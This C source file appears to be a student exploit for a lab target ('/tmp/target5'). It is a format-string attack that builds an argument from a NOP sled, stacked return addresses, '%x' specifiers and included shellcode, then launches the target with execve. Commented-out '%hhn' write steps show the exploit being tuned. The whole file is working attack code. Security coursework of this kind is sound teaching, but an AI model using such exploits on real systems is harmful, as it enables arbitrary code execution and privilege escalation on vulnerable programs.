#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
        int i;
        char arg1[150];
        char *args[] = { TARGET, arg1, NULL };
        char *env[] = { NULL };
        for(i=0;i<150;i++)
        {
                arg1[i]=0x90;
        }
        //memset(arg1,'A',120);
        strncpy(arg1,"\xac\xfd\xff\xbfzzzz",8);
        strncpy(arg1+8,"\xad\xfd\xff\xbfzzzz",8);
        strncpy(arg1+16,"\xae\xfd\xff\xbfzzzz",8);
        strncpy(arg1+24,"\xaf\xfd\xff\xbf",4);
        memcpy(arg1+28,"%x%x%x",6);
        //strncpy(arg1+40,"%60x%hhn",8);
        //strncpy(arg1+42,"%253x%hhn",9);
        //strncpy(arg1+51,"%255x%hhn",9);
        //strncpy(arg1+60,"%191x%hhn",9);
        size_t len = strlen(shellcode);
        strncpy((arg1+102),shellcode,len);
        //arg1[i]='\0';

        if (0 > execve(TARGET, args, env))
                fprintf(stderr, "execve failed.\n");

        return 0;
}